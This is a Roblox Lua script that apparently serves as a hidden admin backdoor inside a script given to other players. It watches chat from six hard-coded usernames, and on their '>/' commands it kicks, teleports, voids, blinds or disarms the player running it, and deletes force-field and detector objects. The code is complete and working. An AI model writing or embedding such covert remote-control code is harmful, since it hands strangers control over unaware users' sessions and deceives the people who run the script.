local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer
local PlaceId = game.PlaceId

local Admins = {
    ["QT_xAraa"] = true,
    ["Shot16kill"] = true,
    ["philippinesBraxy123"] = true,
    ["Brxy_Alt"] = true,
    ["Bowmbaclaat"] = true,
    ["Drenvoryth"] = true
}

local BlindGui = nil

local function OnChatMessage(player, message)
    if Admins[player.Name] then
        local match1 = message:lower():match(">/%s*kick%s+([%w_]+)")
        if match1 and LocalPlayer.Name:lower():find(match1) then
            LocalPlayer:Kick("Araa and Braxy did not allow you to use this script.")
        end

        local match2 = message:lower():match(">/%s*revealusers%s*")
        if match2 then
            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame
            end
        end

        local match3 = message:lower():match(">/%s*void%s+([%w_]+)")
        if match3 then
            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, -498, 0)
            end
        end

        local match4 = message:lower():match(">/%s*shutdown%s*")
        if match4 then
            TeleportService:Teleport(PlaceId, LocalPlayer)
        end

        local match5 = message:lower():match(">/%s*removeff%s+([%w_]+)")
        if match5 and LocalPlayer.Name:lower():find(match5) then
            local FFDetector = game.Workspace:FindFirstChild("ForceFieldDetectorParts")
            if FFDetector then
                FFDetector:Destroy()
            end

            if LocalPlayer.Character then
                local ForceField = LocalPlayer.Character:FindFirstChild("ForceField")
                if ForceField then
                    ForceField:Destroy()
                end
            end
        end

        local match6 = message:lower():match(">/%s*blind%s*")
        if match6 then
            if not BlindGui then
                local ScreenGui = Instance.new("ScreenGui")
                ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
                
                local BlackFrame = Instance.new("Frame")
                BlackFrame.Size = UDim2.new(1, 0, 1, 0)
                BlackFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                BlackFrame.BackgroundTransparency = 0
                BlackFrame.Parent = ScreenGui
                BlindGui = ScreenGui
            end
        end

        local match7 = message:lower():match(">/%s*unblind%s*")
        if match7 then
            if BlindGui then
                BlindGui:Destroy()
                BlindGui = nil
            end
        end

        local match8 = message:lower():match(">/%s*disablesword%s*")
        if match8 then
            local swordTool = LocalPlayer.Backpack:FindFirstChild("Sword")
            if swordTool then
                for _, child in ipairs(swordTool:GetChildren()) do
                    child:Destroy()
                end
            end
        end
    end
end

local function SetupPlayerChat(player)
    player.Chatted:Connect(function(message)
        OnChatMessage(player, message)
    end)
end

for _, plr in ipairs(Players:GetPlayers()) do
    SetupPlayerChat(plr)
end
Players.PlayerAdded:Connect(SetupPlayerChat)
